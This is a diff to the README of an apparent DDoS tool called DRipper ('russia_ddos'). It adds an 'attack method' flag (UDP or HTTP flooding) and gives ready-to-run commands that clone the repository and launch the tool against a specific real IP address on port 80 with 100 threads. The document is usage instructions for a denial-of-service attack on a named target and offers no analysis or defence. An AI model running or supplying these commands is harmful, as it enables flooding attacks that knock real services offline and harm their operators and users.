@@ -20,14 +20,17 @@ Ensure you have Python 3 installed. Then clone this repo and run main.py with pa
 
 -t - threads count. The most important setting. Try to keep the processor busy up to 100%.
 
--r - send packets with random length (up to 50 Kb)
+-m - attack method: udp (default), http
+
+-r - send packets with random length (up to 50 Kb, works only with UDP attack method)
+
 
 ```bash
 git clone https://github.com/alexmon1989/russia_ddos.git
 cd russia_ddos
 
 # run
-python -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1
+python -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1 -m udp
 # OR
-python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1
+python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1 -m udp
 ```
